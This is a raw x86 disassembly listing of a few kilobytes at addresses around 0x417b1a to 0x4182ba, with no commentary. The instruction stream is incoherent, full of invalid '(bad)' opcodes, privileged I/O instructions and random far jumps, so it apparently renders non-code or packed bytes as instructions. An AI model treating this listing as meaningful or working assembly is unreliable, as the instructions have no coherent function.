  417b1a:	jo     0x417b4e
  417b1c:	xchg   ecx,eax
  417b1d:	ffreep st(3)
  417b1f:	(bad)  
  417b21:	in     al,0x7d
  417b23:	jecxz  0x417add
  417b25:	mov    bh,0xfc
  417b27:	fld    QWORD PTR [esi+0x1a]
  417b2a:	hlt    
  417b2b:	addr16 inc ebp
  417b2d:	dec    esp
  417b2e:	arpl   ax,cx
  417b30:	test   ah,cl
  417b32:	imul   ebx,DWORD PTR [edx],0xb445abef
  417b38:	jmp    0x2c0b:0xa6348b9b
  417b3f:	push   0xd3a96908
  417b44:	jb     0x417bac
  417b46:	outs   dx,BYTE PTR ds:[esi]
  417b47:	mov    gs,ebx
  417b49:	jge    0x417b8c
  417b4b:	ins    BYTE PTR es:[edi],dx
  417b4c:	repnz popa 
  417b4e:	std    
  417b4f:	jecxz  0x417b3d
  417b51:	cmp    ecx,DWORD PTR [ecx]
  417b53:	sbb    BYTE PTR [ebp+0x81bf44b],al
  417b59:	int3   
  417b5a:	out    0xc7,eax
  417b5c:	dec    esi
  417b5d:	add    eax,0xda10e790
  417b62:	(bad)  
  417b63:	fdivrp st(5),st
  417b65:	jmp    0x1e302efe
  417b6a:	jmp    0x417bda
  417b6c:	ja     0x417bcd
  417b6e:	mov    ds:0xf0450141,al
  417b73:	mov    DWORD PTR [eax],0x57a7598b
  417b79:	sar    DWORD PTR [edx+edx*4],0x9d
  417b7d:	dec    edi
  417b7e:	std    
  417b7f:	adc    al,0x3f
  417b81:	(bad)  
  417b82:	in     al,dx
  417b83:	sub    DWORD PTR [esi+ebx*4+0x70],0xcec5b5c8
  417b8b:	and    dl,BYTE PTR [ecx+0x64]
  417b8e:	xor    BYTE PTR [esi+0x48b88ce4],0xfb
  417b95:	imul   esi,DWORD PTR [esi+0x5dbe5580],0xffffffce
  417b9c:	push   eax
  417b9d:	pop    ebx
  417b9e:	fsubp  st(2),st
  417ba0:	dec    ebx
  417ba1:	jmp    0x33fd:0x8d70477a
  417ba8:	(bad)  
  417ba9:	loope  0x417c00
  417bab:	clc    
  417bac:	push   cs
  417bad:	ins    DWORD PTR es:[edi],dx
  417bae:	push   esp
  417baf:	enter  0x9cdb,0xb8
  417bb3:	repz xor BYTE PTR [ecx+0x1fc71ddf],al
  417bba:	mov    ebx,DWORD PTR [edx]
  417bbc:	out    0x1,al
  417bbe:	xchg   ebp,eax
  417bbf:	std    
  417bc0:	or     DWORD PTR [edx+0x48020806],ebp
  417bc6:	or     eax,0xffffffbb
  417bc9:	into   
  417bca:	enter  0x564e,0x85
  417bce:	aad    0x8c
  417bd0:	jmp    0x417b76
  417bd2:	pop    es
  417bd3:	ja     0x417bd8
  417bd5:	mov    ds:0x686ee3d,eax
  417bda:	repz pop ss
  417bdc:	iret   
  417bdd:	pop    es
  417bde:	and    ecx,eax
  417be0:	scas   eax,DWORD PTR es:[edi]
  417be1:	popa   
  417be2:	mov    eax,0xfd5c84a6
  417be7:	add    al,BYTE PTR [edx]
  417be9:	jge    0x417b70
  417beb:	nop
  417bec:	imul   esp,DWORD PTR [ecx],0xb9e9c810
  417bf2:	jno    0x417bf8
  417bf4:	iret   
  417bf5:	xchg   ebx,eax
  417bf6:	mov    ds:0xd964eb4f,eax
  417bfb:	dec    edx
  417bfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bfd:	pop    ecx
  417bfe:	ja     0x417bfb
  417c00:	mov    al,ds:0x652501df
  417c05:	dec    ebp
  417c06:	add    ebp,ebp
  417c08:	push   es
  417c09:	pop    ebx
  417c0a:	std    
  417c0b:	ins    BYTE PTR es:[edi],dx
  417c0c:	fiadd  DWORD PTR [esi-0x62]
  417c0f:	scas   eax,DWORD PTR es:[edi]
  417c10:	push   ss
  417c11:	or     ecx,edi
  417c13:	(bad)  
  417c14:	or     eax,eax
  417c16:	add    DWORD PTR [ecx+0x5e],0x8d6e37cf
  417c1d:	(bad)  
  417c1f:	ss dec edx
  417c21:	inc    edi
  417c22:	mov    cl,0xbc
  417c24:	sub    BYTE PTR [ebp-0x67],ch
  417c27:	mov    al,ds:0xb13adf65
  417c2c:	cmp    DWORD PTR [eax],ebp
  417c2e:	pop    ebp
  417c2f:	inc    eax
  417c30:	mov    bh,0xf6
  417c32:	cld    
  417c33:	xor    eax,0xc868468
  417c38:	ins    BYTE PTR es:[edi],dx
  417c39:	mov    dl,BYTE PTR [ebx]
  417c3b:	pusha  
  417c3c:	(bad)  
  417c3d:	fdivr  DWORD PTR [ecx+ecx*1+0x267c97d0]
  417c44:	gs mov edx,0x14ff4772
  417c4a:	pop    ss
  417c4b:	(bad)  
  417c4c:	stos   DWORD PTR es:[edi],eax
  417c4d:	(bad)  
  417c4e:	jne    0x417c29
  417c50:	cdq    
  417c51:	aad    0x2f
  417c53:	loope  0x417cc0
  417c55:	icebp  
  417c56:	jl     0x417c5e
  417c58:	xchg   esi,eax
  417c59:	test   DWORD PTR [ecx-0x2922d7b],esp
  417c5f:	jno    0x417c07
  417c61:	out    dx,al
  417c62:	pop    edx
  417c63:	sub    eax,0x998c83a9
  417c68:	xchg   bh,bl
  417c6a:	cmp    al,0x54
  417c6c:	mov    al,0xef
  417c6e:	sub    bh,BYTE PTR [esi-0x48]
  417c71:	or     BYTE PTR [ebx+0x39cdebc1],ah
  417c77:	rsm    
  417c79:	inc    eax
  417c7a:	stos   DWORD PTR es:[edi],eax
  417c7b:	push   ecx
  417c7c:	test   eax,0xca8127d9
  417c81:	aam    0xdc
  417c83:	cmp    cl,dh
  417c85:	enter  0xa112,0xf6
  417c89:	nop
  417c8a:	stos   BYTE PTR es:[edi],al
  417c8b:	push   ebp
  417c8c:	jmp    0x417d03
  417c8e:	ss add al,0xa3
  417c91:	ror    BYTE PTR [edi+eax*8-0x7d67ca3],0xd6
  417c99:	pop    ds
  417c9a:	pop    ss
  417c9b:	mov    dl,ah
  417c9d:	push   0xfffffffd
  417c9f:	lods   al,BYTE PTR ds:[esi]
  417ca0:	sub    esp,DWORD PTR [edi]
  417ca2:	out    dx,eax
  417ca3:	xchg   edx,eax
  417ca4:	(bad)  
  417ca6:	and    cl,al
  417ca8:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  417caa:	and    al,0xa2
  417cac:	test   DWORD PTR [ebx-0xd140a0b],esp
  417cb2:	rcl    DWORD PTR ds:0xd0175538,cl
  417cb8:	jne    0x417c99
  417cba:	adc    BYTE PTR [esi+0x3b],al
  417cbd:	push   ss
  417cbe:	(bad)  
  417cc1:	stos   BYTE PTR es:[edi],al
  417cc2:	test   al,0x14
  417cc4:	jmp    0x417c72
  417cc6:	je     0x417c96
  417cc8:	jmp    0xddea:0xfac1087a
  417ccf:	jnp    0x417d4f
  417cd1:	add    edi,DWORD PTR [edi]
  417cd3:	rol    DWORD PTR [ebp-0x14788c94],1
  417cd9:	data16 (bad) 
  417cdb:	sbb    ebx,eax
  417cdd:	enter  0xe764,0xeb
  417ce1:	imul   ebx,ecx,0xe20fc10d
  417ce7:	pop    edi
  417ce8:	jb     0x417cc8
  417cea:	sahf   
  417ceb:	into   
  417cec:	jns    0x417d62
  417cee:	loope  0x417d13
  417cf0:	mov    dl,0x2f
  417cf2:	out    dx,eax
  417cf3:	shr    ebx,cl
  417cf5:	(bad)  
  417cf6:	iret   
  417cf7:	sub    ebx,ebx
  417cf9:	into   
  417cfa:	dec    ebx
  417cfb:	and    BYTE PTR ds:0x3c5748dc,bl
  417d01:	cli    
  417d02:	mov    ds:0x1d0e49b1,eax
  417d07:	sub    cl,ch
  417d09:	ja     0x417d08
  417d0b:	(bad)  
  417d0c:	dec    BYTE PTR [ebp+0x53]
  417d0f:	sub    bl,bh
  417d11:	add    BYTE PTR [esi+0x7480d5c7],0x80
  417d18:	cmp    DWORD PTR [edi+0x1e3c42c3],edi
  417d1e:	(bad)  
  417d1f:	jne    0x417da0
  417d21:	mov    esi,0xd5c20848
  417d26:	sbb    al,0x34
  417d28:	jae    0x417d09
  417d2a:	xchg   ebp,eax
  417d2b:	fadd   DWORD PTR [eax+0x55]
  417d2e:	mul    BYTE PTR [edx+0x47]
  417d31:	in     eax,dx
  417d32:	cld    
  417d33:	or     eax,0xe0280698
  417d38:	in     eax,dx
  417d39:	jl     0x417ce5
  417d3b:	enter  0x4fe6,0xdc
  417d3f:	pop    ecx
  417d40:	inc    ebx
  417d41:	adc    eax,0x5a13fb16
  417d46:	lods   eax,DWORD PTR ds:[esi]
  417d47:	sbb    DWORD PTR [esi+0x1f],edi
  417d4a:	sbb    BYTE PTR [edi],cl
  417d4c:	shr    cl,0xb8
  417d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d50:	icebp  
  417d51:	pop    ds
  417d52:	mov    eax,ds:0x41844616
  417d57:	sbb    bl,ch
  417d59:	repnz xchg esp,eax
  417d5b:	mov    bh,0xdb
  417d5d:	mov    al,0x8a
  417d5f:	call   0x6b1e:0xa2ccdf64
  417d66:	lock daa 
  417d68:	mov    ch,0x47
  417d6a:	std    
  417d6b:	jg     0x417d86
  417d6d:	lahf   
  417d6e:	push   esi
  417d6f:	mov    cs,WORD PTR [edx]
  417d71:	faddp  st(6),st
  417d73:	enter  0xe7e1,0xda
  417d77:	jecxz  0x417d13
  417d79:	adc    eax,DWORD PTR [eax]
  417d7b:	(bad)  
  417d7c:	jmp    0x417dce
  417d7e:	or     ecx,DWORD PTR [eax-0x19]
  417d81:	aad    0x74
  417d83:	cmp    edi,DWORD PTR [ebp-0x21]
  417d86:	retf   0x62e8
  417d89:	xchg   bh,dl
  417d8b:	cld    
  417d8c:	xor    DWORD PTR [eax],ebp
  417d8e:	std    
  417d8f:	leave  
  417d90:	pop    esp
  417d91:	sub    eax,0xbccf53f8
  417d96:	stos   BYTE PTR es:[edi],al
  417d97:	enter  0xadc2,0x23
  417d9b:	mov    ch,0x83
  417d9d:	loopne 0x417e0b
  417d9f:	push   0xffffffeb
  417da1:	fsubrp st(1),st
  417da3:	pop    ds
  417da4:	mov    dl,0xb8
  417da6:	push   ds
  417da7:	test   DWORD PTR [edi-0x20],edi
  417daa:	mov    esi,0x14d71e5c
  417daf:	inc    ecx
  417db0:	imul   edx,esi,0xffffff99
  417db3:	or     esp,DWORD PTR [ebx+0x708a0391]
  417db9:	jl     0x417db8
  417dbb:	outs   dx,DWORD PTR ds:[esi]
  417dbc:	enter  0xd24e,0xd7
  417dc0:	xchg   bh,bl
  417dc2:	dec    eax
  417dc3:	mov    ebx,0x7ac91dc6
  417dc8:	add    dh,bh
  417dca:	cld    
  417dcb:	lods   al,BYTE PTR ds:[esi]
  417dcc:	xor    bh,BYTE PTR [esi]
  417dce:	mov    ds:0x43d97bf7,al
  417dd3:	xchg   esi,eax
  417dd4:	push   edx
  417dd5:	fistp  QWORD PTR [ebp+edx*8+0x4a6e572a]
  417ddc:	in     al,dx
  417ddd:	shl    ebx,cl
  417ddf:	mov    esp,0x46dfae3f
  417de4:	or     BYTE PTR [ebp-0x73],ch
  417de7:	inc    esi
  417de8:	adc    eax,0x75ce4970
  417ded:	fdivr  st,st(7)
  417def:	add    edi,DWORD PTR [edi-0x46b66820]
  417df5:	mov    edi,0x5647be72
  417dfa:	out    0x88,eax
  417dfc:	sbb    BYTE PTR [edi+0x51],bl
  417dff:	or     eax,0x39d09c7e
  417e04:	inc    edx
  417e05:	aad    0x2f
  417e07:	loope  0x417dea
  417e09:	outs   dx,BYTE PTR ds:[esi]
  417e0a:	outs   dx,DWORD PTR ds:[esi]
  417e0b:	enter  0x2859,0x82
  417e0f:	nop
  417e10:	fcom   QWORD PTR [esi+edi*8-0x4]
  417e14:	gs and eax,0x629da377
  417e1a:	mov    ch,0x4b
  417e1c:	and    bh,bl
  417e1e:	pop    eax
  417e1f:	jno    0x417e6e
  417e21:	push   edi
  417e22:	in     eax,dx
  417e23:	and    al,dh
  417e25:	inc    ebx
  417e26:	mov    eax,ds:0x19c7ddbc
  417e2b:	into   
  417e2c:	in     al,dx
  417e2d:	cmc    
  417e2e:	cli    
  417e2f:	into   
  417e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e31:	pop    ds
  417e32:	pop    edx
  417e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e34:	or     al,0x6b
  417e36:	rol    bh,cl
  417e38:	jo     0x417e37
  417e3a:	pop    esi
  417e3b:	mov    eax,0xf9b07474
  417e40:	iret   
  417e41:	sbb    BYTE PTR [ebx+0x6a],ah
  417e44:	frstor [eax+0x30]
  417e47:	ins    BYTE PTR es:[edi],dx
  417e48:	or     DWORD PTR [edx],edx
  417e4a:	int    0xb9
  417e4c:	mov    ebp,DWORD PTR [ebx]
  417e4e:	sub    ecx,eax
  417e50:	or     DWORD PTR [ecx],0xffffffcf
  417e53:	popf   
  417e54:	push   ebx
  417e55:	test   ecx,0xae84ece3
  417e5b:	pop    ecx
  417e5c:	mov    DWORD PTR [eax+0xb0f456c],ebx
  417e62:	sbb    ch,BYTE PTR [esi]
  417e64:	ret    0x7fde
  417e67:	aas    
  417e68:	rcr    BYTE PTR es:0x752f1393,cl
  417e6f:	push   ds
  417e70:	jmp    0x417e84
  417e72:	push   edi
  417e73:	adc    BYTE PTR [eax+0x43ce05b2],ah
  417e79:	fbstp  TBYTE PTR [eax-0x4]
  417e7c:	repnz inc eax
  417e7e:	push   ebp
  417e7f:	test   BYTE PTR [esi],bl
  417e81:	(bad)  
  417e82:	cld    
  417e83:	retf   0xb3ab
  417e86:	sub    bl,BYTE PTR cs:[edx]
  417e89:	jmp    0x417f09
  417e8b:	enter  0xa77e,0xc5
  417e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e90:	add    ch,BYTE PTR [esi]
  417e92:	jge    0x417ea8
  417e94:	add    eax,0x9d19fd7e
  417e99:	cmc    
  417e9a:	inc    ecx
  417e9b:	push   ecx
  417e9c:	jne    0x417e3b
  417e9e:	jmp    0x417e67
  417ea0:	dec    ebp
  417ea1:	add    DWORD PTR [ecx-0x2c],esp
  417ea4:	pop    ds
  417ea5:	ss ds aad 0xeb
  417ea9:	push   0xffffffa4
  417eab:	ds inc eax
  417ead:	pop    esi
  417eae:	fistp  WORD PTR [ecx-0x2a]
  417eb1:	ficom  WORD PTR [ebp+0x4d]
  417eb4:	xchg   edx,eax
  417eb5:	iret   
  417eb6:	xchg   ebx,eax
  417eb7:	inc    esp
  417eb8:	sub    DWORD PTR [edi],0x7d
  417ebb:	cdq    
  417ebc:	jmp    0x417f09
  417ebe:	inc    edx
  417ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ec0:	rcr    DWORD PTR [edx],0x27
  417ec3:	add    DWORD PTR [eax-0x21],0xffffffc5
  417ec7:	pop    ecx
  417ec8:	mov    ds:0x3db8613a,eax
  417ecd:	pop    ebx
  417ece:	(bad)  
  417ecf:	cmp    DWORD PTR [esi-0xffce262],edx
  417ed5:	xchg   esp,eax
  417ed6:	pushf  
  417ed7:	fistp  WORD PTR ds:0x8a7052df
  417edd:	out    0x7b,eax
  417edf:	sub    esp,eax
  417ee1:	dec    ebp
  417ee2:	std    
  417ee3:	sub    eax,0x87ade244
  417ee8:	dec    edi
  417ee9:	mov    ecx,0xc643de38
  417eee:	jae    0x417f3a
  417ef0:	arpl   bx,cx
  417ef2:	cld    
  417ef3:	mov    ds:0xb8719fc7,eax
  417ef8:	mov    edi,0xc80766c
  417efd:	fild   WORD PTR [ecx+esi*8]
  417f00:	mov    ah,0xd6
  417f02:	imul   ebx,DWORD PTR [eiz*2-0x265b024],0xffffffc9
  417f0a:	(bad)  
  417f0b:	pop    esp
  417f0c:	cmp    eax,DWORD PTR [edx-0x5c]
  417f0f:	mov    al,0xea
  417f11:	inc    edi
  417f12:	fs nop
  417f14:	pusha  
  417f15:	(bad)  
  417f16:	jp     0x417f49
  417f18:	or     edx,edi
  417f1a:	sub    al,0xbc
  417f1c:	lods   al,BYTE PTR ds:[esi]
  417f1d:	fdiv   QWORD PTR [ebx-0x17]
  417f20:	xor    edi,DWORD PTR [ecx]
  417f22:	inc    ecx
  417f23:	mov    esi,0x2b174733
  417f28:	loop   0x417f0b
  417f2a:	stos   BYTE PTR es:[edi],al
  417f2b:	dec    eax
  417f2c:	call   0x5f42:0x66732261
  417f33:	enter  0xe05d,0x8e
  417f37:	mov    cl,0x7c
  417f39:	sub    DWORD PTR [edx+0x8b4eb93],edx
  417f3f:	inc    ecx
  417f40:	jge    0x417ec6
  417f42:	adc    dl,dh
  417f44:	sbb    al,0xdf
  417f46:	cdq    
  417f47:	retf   
  417f48:	leave  
  417f49:	push   eax
  417f4a:	sbb    bh,BYTE PTR [ecx+0x19]
  417f4d:	das    
  417f4e:	add    al,0x31
  417f50:	stos   DWORD PTR es:[edi],eax
  417f51:	icebp  
  417f52:	lock in eax,dx
  417f54:	pushf  
  417f55:	or     ecx,DWORD PTR [ebx-0x7faafb41]
  417f5b:	cmp    al,0x34
  417f5d:	add    eax,0x58b395fd
  417f62:	or     dl,BYTE PTR ds:0x98fd896d
  417f68:	cli    
  417f69:	dec    edx
  417f6a:	xchg   esi,eax
  417f6b:	dec    edx
  417f6c:	add    ah,BYTE PTR [esi+0x4c]
  417f6f:	(bad)
  417f72:	jmp    0xbdb5bff0
  417f77:	xchg   ebx,eax
  417f78:	test   al,0xf0
  417f7a:	jl     0x417f44
  417f7c:	je     0x417f96
  417f7e:	and    al,0x2a
  417f80:	dec    ecx
  417f81:	in     al,0x45
  417f83:	mov    ebp,0x8c8993ea
  417f88:	(bad)  
  417f8a:	xlat   BYTE PTR ds:[ebx]
  417f8b:	adc    bh,BYTE PTR [edi+0x57]
  417f8e:	popf   
  417f8f:	ss out dx,eax
  417f91:	fucomip st,st(0)
  417f93:	pop    eax
  417f94:	jecxz  0x418008
  417f96:	fwait
  417f97:	in     al,dx
  417f98:	ficomp DWORD PTR [esi+0x5f3672e6]
  417f9e:	sub    al,al
  417fa0:	jno    0x417f6f
  417fa2:	repnz daa 
  417fa4:	jbe    0x417fae
  417fa6:	retf   
  417fa7:	or     bl,ch
  417fa9:	jmp    0x417fc8
  417fab:	and    eax,0xf5344ffc
  417fb0:	jmp    0x417f59
  417fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fb3:	jp     0x417f5a
  417fb5:	jb     0x417ff6
  417fb7:	xor    BYTE PTR [esi],al
  417fb9:	fist   WORD PTR ds:0xda42ffcd
  417fbf:	xor    DWORD PTR [ebp-0x24],0xffffffe5
  417fc3:	pop    edi
  417fc4:	pop    ebx
  417fc5:	(bad)  
  417fc7:	pop    esp
  417fc8:	mov    esi,0x1da6151f
  417fcd:	cli    
  417fce:	inc    esp
  417fcf:	enter  0x52cb,0x30
  417fd3:	and    bh,0x6e
  417fd6:	(bad)  
  417fd8:	jmp    0x417f92
  417fda:	es pop edi
  417fdc:	lods   al,BYTE PTR ds:[esi]
  417fdd:	jbe    0x417f9b
  417fdf:	out    dx,eax
  417fe0:	pop    edx
  417fe1:	fucomip st,st(5)
  417fe3:	(bad)
  417fe7:	jae    0x417fc6
  417fe9:	loopne 0x417fe7
  417feb:	jbe    0x41802e
  417fed:	ja     0x417fbc
  417fef:	mov    ebp,0xc938828c
  417ff4:	adc    al,0xf7
  417ff6:	ror    BYTE PTR [ebp+0x61],cl
  417ff9:	mov    ch,0x1e
  417ffb:	and    al,0x92
  417ffd:	add    al,0xfc
  417fff:	mov    bl,0x6c
  418001:	mov    cl,0xdb
  418003:	pop    ebx
  418004:	pop    ebx
  418005:	shr    bh,cl
  418007:	stos   DWORD PTR es:[edi],eax
  418008:	setnp  BYTE PTR [ebp-0x473714a3]
  41800f:	add    ecx,ebx
  418011:	popf   
  418012:	mov    dl,0xcf
  418014:	pop    ebx
  418015:	mov    cl,0xaa
  418017:	sub    dl,ch
  418019:	inc    eax
  41801a:	xor    BYTE PTR [ecx+ebx*4+0x3000012b],bl
  418021:	call   0xc6184738
  418026:	cmp    edi,DWORD PTR [ebp+ecx*1-0x60]
  41802a:	add    DWORD PTR [ebx+0xb],edi
  41802d:	or     BYTE PTR [eax],al
  41802f:	rcr    BYTE PTR [esi],0x4c
  418032:	sbb    BYTE PTR [ebx+0x12],0x37
  418036:	adc    al,0xe0
  418038:	neg    bh
  41803a:	jmp    0xf531:0xb84e9cb7
  418041:	test   BYTE PTR [ecx],al
  418043:	pop    es
  418044:	sbb    ebp,DWORD PTR [ebp-0x7e]
  418047:	pop    esp
  418048:	imul   edi,esp,0xffffff9b
  41804b:	sbb    al,0xf8
  41804d:	inc    esp
  41804e:	sub    al,0xc8
  418050:	inc    esi
  418051:	fs gs inc esi
  418054:	or     ch,dh
  418056:	pop    eax
  418057:	push   ss
  418058:	jmp    0x418005
  41805a:	fistp  DWORD PTR [ecx]
  41805c:	sbb    eax,0x25f63765
  418061:	fbld   TBYTE PTR [ebp-0x6e5392ad]
  418067:	stos   BYTE PTR es:[edi],al
  418068:	jecxz  0x41800e
  41806a:	cld    
  41806b:	into   
  41806c:	or     bh,BYTE PTR [ebp+ebp*8-0x2ec8b3aa]
  418073:	(bad)  
  418074:	mov    ecx,0xc998983
  418079:	sub    BYTE PTR gs:[ebp-0x16],cl
  41807d:	div    DWORD PTR [ebx+esi*4-0x70]
  418081:	arpl   WORD PTR [esi-0x2e783298],di
  418087:	push   edi
  418088:	xchg   ebp,eax
  418089:	aad    0x73
  41808b:	jmp    DWORD PTR ds:0x2ecbb697
  418091:	inc    esi
  418092:	xchg   ebp,eax
  418093:	or     DWORD PTR [ebx],esp
  418095:	mov    edi,0x90d1725
  41809a:	cmovno edx,esp
  41809d:	xchg   edx,eax
  41809e:	std    
  41809f:	aam    0x87
  4180a1:	push   0xe0fe1cd2
  4180a6:	and    ah,BYTE PTR [ebp-0x21]
  4180a9:	adc    BYTE PTR [eax+ebx*1],dh
  4180ac:	(bad)  
  4180ad:	mov    esi,DWORD PTR [ecx+ecx*4-0x15]
  4180b1:	add    edx,eax
  4180b3:	push   cs
  4180b4:	xor    ecx,ebx
  4180b6:	mov    dh,BYTE PTR [ebx-0x44813bf9]
  4180bc:	sahf   
  4180bd:	push   esp
  4180be:	test   ch,al
  4180c0:	sub    eax,0x2b5df328
  4180c5:	mov    ebp,0xdfe43fdb
  4180ca:	lods   al,BYTE PTR ds:[esi]
  4180cb:	xchg   ebx,eax
  4180cc:	test   BYTE PTR [ebp-0x700e3aa5],0xfd
  4180d3:	xchg   edi,eax
  4180d4:	inc    esp
  4180d5:	mov    al,ds:0x1e3a5003
  4180da:	das    
  4180db:	mov    edi,0x48b40711
  4180e0:	jnp    0x418133
  4180e2:	xor    DWORD PTR [eax],ecx
  4180e4:	adc    BYTE PTR [ecx+eiz*8],dl
  4180e7:	xchg   edx,eax
  4180e8:	std    
  4180e9:	pop    edi
  4180ea:	call   0x27e813e3
  4180ef:	scas   al,BYTE PTR es:[edi]
  4180f0:	fsubr  QWORD PTR [edi-0x2007b5b5]
  4180f6:	lea    esp,[ebx]
  4180f8:	sbb    eax,0x342fae23
  4180fd:	sub    edi,esi
  4180ff:	jo     0x4180f4
  418101:	out    0xa9,al
  418103:	xor    al,BYTE PTR [ebx-0x43]
  418106:	ror    BYTE PTR [edi+0x2f],0xf0
  41810a:	cmp    ecx,DWORD PTR [eax+edx*4+0x351ba7df]
  418111:	pop    esi
  418112:	ror    DWORD PTR [ebx-0x41],cl
  418115:	retf   
  418116:	ficom  DWORD PTR [esi-0x382a5a41]
  41811c:	mov    bl,0xc6
  41811e:	inc    eax
  41811f:	out    0xf2,al
  418121:	call   0x9979489f
  418126:	mov    al,0x33
  418128:	xchg   edi,eax
  418129:	scas   eax,DWORD PTR es:[edi]
  41812a:	mov    dh,0xfc
  41812c:	in     al,0x24
  41812e:	std    
  41812f:	dec    eax
  418130:	shr    DWORD PTR [ebp-0x4e],1
  418133:	cmp    BYTE PTR [ebx+0x2c],dl
  418136:	pop    ecx
  418137:	enter  0xe5f0,0xf
  41813b:	xchg   BYTE PTR [ebx+0x3],cl
  41813e:	jp     0x418160
  418140:	jmp    0x56f71f29
  418145:	jb     0x41819f
  418147:	sub    BYTE PTR [ebp+0x2f],dl
  41814a:	sbb    DWORD PTR [edx],ebp
  41814c:	aam    0xc5
  41814e:	or     cl,bl
  418150:	fbstp  TBYTE PTR [eax-0x39]
  418153:	in     al,0xb9
  418155:	popa   
  418156:	mov    ah,0xd8
  418158:	xor    BYTE PTR [ebx-0x2a19517b],0x1e
  41815f:	push   ds
  418160:	mov    ch,0xd8
  418162:	pushf  
  418163:	push   ss
  418164:	loop   0x41815f
  418166:	jmp    0x6e9a:0xfc2426c7
  41816d:	and    DWORD PTR [ecx+0x73],edi
  418170:	and    esi,DWORD PTR [esi+0x0]
  418173:	cli    
  418174:	in     al,dx
  418175:	xchg   esp,eax
  418176:	test   BYTE PTR [eax+0x36],0x87
  41817a:	adc    cl,BYTE PTR [ecx]
  41817c:	sub    edi,ebx
  41817e:	xchg   ebx,eax
  41817f:	add    bh,BYTE PTR [ebx-0x2fca1e65]
  418185:	and    ch,BYTE PTR [edx]
  418187:	(bad)
  41818a:	fidivr DWORD PTR [edx]
  41818c:	out    0xa1,al
  41818e:	std    
  41818f:	mov    esi,0xc820515f
  418194:	rol    DWORD PTR [eax],0xcb
  418197:	sbb    cl,ah
  418199:	sti    
  41819a:	in     al,0x63
  41819c:	jmp    0x418134
  41819e:	lods   al,BYTE PTR es:[esi]
  4181a0:	and    al,0xeb
  4181a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181a3:	std    
  4181a4:	fbstp  TBYTE PTR ss:[eax-0x2]
  4181a8:	arpl   WORD PTR [ebx],sp
  4181aa:	cmp    cl,bh
  4181ac:	data16 mov dh,0xfc
  4181af:	and    ebx,ebp
  4181b1:	jp     0x4181d8
  4181b3:	xchg   ecx,eax
  4181b4:	inc    ecx
  4181b5:	out    0x9a,eax
  4181b7:	mov    esp,0x89d048f1
  4181bc:	scas   eax,DWORD PTR es:[edi]
  4181bd:	jle    0x4181b5
  4181bf:	das    
  4181c0:	push   ss
  4181c1:	dec    edx
  4181c3:	pop    es
  4181c4:	jmp    0x418183
  4181c6:	pop    eax
  4181c7:	xor    cl,dh
  4181c9:	pop    ecx
  4181ca:	sbb    BYTE PTR [eax+0x72b2e06f],ah
  4181d0:	pusha  
  4181d1:	jge    0x418165
  4181d3:	cmp    BYTE PTR [eax-0x6d],al
  4181d6:	jmp    FWORD PTR [edi]
  4181d8:	in     al,dx
  4181d9:	add    DWORD PTR [ecx+0x74],edi
  4181dc:	add    BYTE PTR [ecx+0x4a],0xc2
  4181e0:	aaa    
  4181e1:	add    dl,ch
  4181e3:	sbb    eax,0x10d4dfea
  4181e8:	push   ebx
  4181e9:	xor    eax,0x48a505af
  4181ee:	std    
  4181ef:	addr16 pmuludq mm5,mm3
  4181f3:	or     BYTE PTR [esi+0x47],al
  4181f6:	xchg   esp,eax
  4181f7:	(bad)  
  4181f8:	out    0x92,eax
  4181fa:	pushf  
  4181fb:	dec    ebx
  4181fc:	shr    edi,1
  4181fe:	mov    WORD PTR [esi-0x1002ee84],?
  418204:	out    dx,eax
  418205:	sbb    dl,BYTE PTR [esi+esi*2-0x7a]
  418209:	xchg   DWORD PTR [eax+ecx*8],edi
  41820c:	cmp    BYTE PTR [ebx+0x40],cl
  41820f:	fnop   
  418211:	sub    DWORD PTR [esi-0x5b7a1af0],ecx
  418217:	into   
  418218:	mov    edx,DWORD PTR [ebx]
  41821a:	inc    ecx
  41821b:	sahf   
  41821c:	cmc    
  41821d:	fisttp WORD PTR [edi-0x3bf813af]
  418223:	or     eax,0x6f003c93
  418228:	(bad)  
  418229:	das    
  41822a:	lahf   
  41822b:	mov    al,ds:0x539477f1
  418230:	test   al,0xdd
  418232:	jae    0x4181be
  418234:	sub    al,0x13
  418236:	mov    ds:0x68e5b82b,ax
  41823c:	out    dx,al
  41823d:	xor    BYTE PTR [edi+esi*1-0xd876074],dh
  418244:	out    dx,al
  418245:	xchg   ebx,eax
  418246:	pop    ds
  418247:	mov    dh,0xa3
  418249:	out    0x1c,eax
  41824b:	enter  0xec28,0x9
  41824f:	fdiv   DWORD PTR [esi-0x5d]
  418252:	cld    
  418253:	xchg   ebp,eax
  418254:	dec    edi
  418255:	pop    edx
  418256:	and    esi,ecx
  418258:	mov    edx,0x59c85a66
  41825d:	mov    esi,0x12cda0f7
  418262:	push   esp
  418263:	cmc    
  418264:	jmp    0x418242
  418266:	dec    edx
  418267:	stc    
  418268:	loop   0x4182ae
  41826a:	jb     0x4181f6
  41826c:	xor    bh,bl
  41826e:	inc    esi
  41826f:	xchg   ebx,eax
  418270:	hlt    
  418271:	pop    ebx
  418272:	in     eax,dx
  418273:	test   eax,0x652a5685
  418278:	jmp    0x4e6:0xf621a6e1
  41827f:	add    BYTE PTR [esi],bh
  418281:	in     al,0x47
  418283:	enter  0xb434,0xab
  418287:	jnp    0x418293
  418289:	shr    DWORD PTR [eax-0x7f],1
  41828c:	jmp    0x418267
  41828e:	dec    ebx
  41828f:	aas    
  418290:	mov    dl,dl
  418292:	mov    ds:0xd5df6fae,al
  418297:	or     BYTE PTR ds:0xc374a1de,0x1c
  41829e:	cld    
  41829f:	lods   al,BYTE PTR ds:[esi]
  4182a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182a1:	out    0x1e,al
  4182a3:	or     DWORD PTR [ebx],ebp
  4182a5:	mov    al,ds:0x4c68758b
  4182aa:	mov    ebp,0x83ebd8c6
  4182af:	mov    ah,0x79
  4182b1:	pop    ds
  4182b2:	repnz sub eax,0x8ef57533
  4182b8:	jmp    0x41831e
  4182ba:	pushf  
